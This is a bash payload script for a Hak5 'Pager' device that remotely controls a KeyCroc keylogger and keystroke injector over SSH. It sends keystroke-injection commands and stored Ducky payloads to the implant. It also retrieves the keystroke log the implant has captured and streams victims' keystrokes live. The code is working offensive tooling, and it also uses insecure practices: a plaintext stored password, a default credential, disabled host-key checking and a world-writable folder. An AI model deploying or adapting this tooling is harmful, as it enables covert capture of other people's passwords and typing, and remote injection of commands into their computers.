#!/bin/bash

# Title: Pager quack
# Author: spywill
# Description: Send QUACK commands to your KeyCroc, as well as read previously captured keystrokes and monitor live keystrokes as they are entered.
# Version: 2.0

PROMPT "Send QUACK commands to your KeyCroc, read previously captured keystrokes and monitor live keystrokes.
sshpass is required for the connection.
Make sure the Pager and KeyCroc are connected to the same local network.
Alternatively, KeyCroc can connect directly to the Pager's open access point (AP)"

# Payload variables
DUCKY_PAYLOAD="/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads"
PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_passwd.txt"
CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_IP.txt"
SAVE_KEYSTROKE="/mmc/root/payloads/user/remote_access/Pager_quack/KeyCroc_Keystrokes"
REMOTE_FILE="/root/loot/croc_char.log"
chmod 777 /mmc/root/payloads/user/remote_access/Pager_quack

# Create Ducky Payload folder if it does not exist
if [ ! -d "$DUCKY_PAYLOAD" ] || [ ! -d "$SAVE_KEYSTROKE" ]; then
	mkdir -p "$DUCKY_PAYLOAD"
	mkdir -p "$SAVE_KEYSTROKE"
	LOG yellow "Created Ducky Payloads folder: $DUCKY_PAYLOAD"
	LOG yellow "Created Keystrokes folder: $SAVE_KEYSTROKE"
	# Create default Ducky Payload if it does not exist
	if [ ! -f "$DUCKY_PAYLOAD/QUACK.txt" ]; then
		cat > "$DUCKY_PAYLOAD/QUACK.txt" <<'EOF'
#---> Default Ducky Payload
QUACK STRING "test 1"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "test 2"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "working"
QUACK ENTER
EOF
		LOG yellow "Created default Ducky Payload name QUACK.txt"
	fi
fi

# Checking if sshpass is installed
if opkg list-installed | grep -q "sshpass"; then
	LOG yellow "Package sshpass is already installed."
else
	# Check internet connection
	LOG yellow "Checking internet connection."
	if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
		ERROR_DIALOG "Internet connection required to install sshpass" ; exit 0
	fi
	LOG green "Online"
	# Confirmation to install sshpass
	confirm=$(CONFIRMATION_DIALOG "Install sshpass") || exit 1
	if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
		spinnerid=$(START_SPINNER "Installing sshpass...")
		opkg update
		opkg -d mmc install sshpass
		STOP_SPINNER ${spinnerid}
		if opkg list-installed | grep -q "sshpass"; then
			LOG green "sshpass has been installed."
		else
			ERROR_DIALOG "Error sshpass not in installed" ; exit 0
		fi
	else
		LOG red "User selected no" ; exit 0
	fi
fi

# resolve croc.lan/croc into IP
if ip_check=$(ping -4 -c 1 -W 5 croc.lan 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc.lan is up at $croc_ip"
elif ip_check=$(ping -4 -c 1 -W 5 croc 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc is up at $croc_ip"
else
	LOG red "croc.lan and croc did not resolve"

	if [ -f "$CROC_IP_FILE" ]; then
		LOG green "Croc IP file exists $CROC_IP_FILE"
		ip_check=$(cat "$CROC_IP_FILE")
		if [ -n "$ip_check" ]; then
			LOG yellow "Using saved Croc IP: $croc_ip"
		else
			LOG red "Croc IP file is empty"
			ip_check=""
		fi
	else
		LOG red "Croc IP file missing or empty"
		ip_check=""
	fi
	croc_ip=$(IP_PICKER "Enter keycroc IP" "$ip_check") || exit 0
fi

# save keycroc ip to file
echo "$croc_ip" > "$CROC_IP_FILE"
LOG yellow "Saved Keycroc IP $croc_ip at $CROC_IP_FILE"

# Checking if key croc is reachability
can_reach() {
	host="$1"
	ping -4 -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
	nc -z -w 2 "$host" 22 >/dev/null 2>&1
}

# Checking and save key croc password
if can_reach "$croc_ip"; then
	LOG green "Keycroc $croc_ip reachable"
	if [ -f "$PASS_FILE" ]; then
		LOG yellow "Password file exists"
		default_pass=$(cat "$PASS_FILE")
	else
		LOG red "Password file missing or empty"
		default_pass="hak5croc"
	fi

	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "$default_pass") || exit 0
	echo "$croc_passwd" > "$PASS_FILE"
	LOG yellow "Saved Keycroc Password at $PASS_FILE"
else
	ERROR_DIALOG "$croc_ip unreachable" ; exit 0
fi

# Sending QUACK command over SSH
Send_Quack() {
	spinnerid=$(START_SPINNER "Exceeding payload...")
	/mmc/usr/bin/sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@"$croc_ip" <<EOF
	$( if [[ -f "$QUACK" ]]; then
		cat "$QUACK"
	else
		echo "$QUACK"
	fi )
EOF
	STOP_SPINNER ${spinnerid}
	sleep 1
	PROMPT "Payload has been delivered"
}

# Enter a single Quack command
Quack_Command() {
	LOG yellow "You have selected a single Quack command"
	QUACK=$(TEXT_PICKER "Enter Quack command" "QUACK STRING hello world") || exit 0
	Send_Quack
}

# Run a ducky payload
Ducky_Payload() {
	LOG blue "================================================="
	LOG yellow "You have selected a ducky payload Ensure to give your payload a name"
	LOG cyan "[name_of_payload.txt]"
	LOG yellow "Save payloads at:"
	LOG cyan "[/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads/name_of_payload.txt]"
	LOG blue "================================================="
	LOG green "Press any button to continue"
	WAIT_FOR_INPUT

	# Build the list of .txt files
	files=""
	for file in "$DUCKY_PAYLOAD"/*.txt; do
		[ -f "$file" ] || continue
		files="$files $(basename "$file")"
	done
	# Check if any files were found
	if [ -z "$files" ]; then
		ERROR_DIALOG "No .txt files found in $DUCKY_PAYLOAD"
	fi
	# Build LIST_PICKER arguments
	for file in $files; do
		set -- "$@" "$file"
	done

	resp=$(LIST_PICKER \
		"DUCKY PAYLOAD MENU" \
		"$@" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)

	# Return to main menu / exit
	if [[ "$resp" == "Main_menu" ]]; then
		LOG yellow "Return to main menu"
		return
	elif [[ "$resp" == "Exit" ]]; then
		confirm=$(CONFIRMATION_DIALOG "Exit. Continue?")
		if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
			exit 0
		else
			LOG yellow "Return to main menu"
			return
		fi
	fi

	# Full path to the selected file
	QUACK="$DUCKY_PAYLOAD/$resp"
	LOG green "Selected Payload:"
	LOG "$(cat $QUACK)"
	Send_Quack
}

# Previous/live keystrokes menu
keystrokes() {
		key=$(LIST_PICKER \
		"KEYSTROKE MENU" \
		"Previous_keystrokes" \
		"Live_keystrokes" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)
	
	case "$key" in
		"Previous_keystrokes")
			LOG yellow "You have selected read Previous keystrokes"
			spinnerid=$(START_SPINNER "Collecting keystroke...")
			OUTPUT=$(
			/mmc/usr/bin/sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@"$croc_ip" '
			find / -type f -name "croc_char.log" 2>/dev/null -exec sh -c "
			for file do
				chars=\$(wc -m < \"\$file\")
				echo \"File: \$file\"
				echo \"number of char: \$chars\"
				echo \"------------------------\"
				strings \"\$file\"
				echo
			done
			" sh {} +
			'
			)
			STOP_SPINNER ${spinnerid}
			echo "$OUTPUT" > $SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt
			sleep 1
			echo "$OUTPUT" > "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
			while IFS= read -r line; do
				LOG "$line"
			done < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
			sleep 2
			LOG yellow "keystrokes saved to $SAVE_KEYSTROKE_FILE"
			LOG green "PRESS A BUTTON TO RETURN TO MENU"
			WAIT_FOR_BUTTON_PRESS A
		;;
		"Live_keystrokes")
			LOG yellow "You have selected read live keystrokes"
			LOG ""
			LOG green "PRESS A BUTTON TO STOP LIVE KEYSTROKES"
			sleep 5
			/mmc/usr/bin/sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
			"tail -c 10 -f '$REMOTE_FILE'" |
			while IFS= read -r -n1 char; do
				LOG "$char"
			done &

			WAIT_FOR_BUTTON_PRESS A
			pgrep -f "ssh -o StrictHostKeyChecking=no root@$croc_ip" | xargs -r kill
			sleep 2
		;;
		"Main_menu")
			LOG yellow "Return to main menu"
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. Continue?") || exit 1
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
}

# Main menu loop
while true; do
	resp=$(LIST_PICKER \
		"MAIN MENU" \
		"Quack_Command" \
		"Ducky_Payload" \
		"keystrokes" \
		"Exit" \
		"Exit"
	)
	
	case "$resp" in
		"Quack_Command")
			Quack_Command
		;;
		"Ducky_Payload")
			Ducky_Payload
		;;
		"keystrokes")
			keystrokes
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. Continue?") || exit 1
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
done
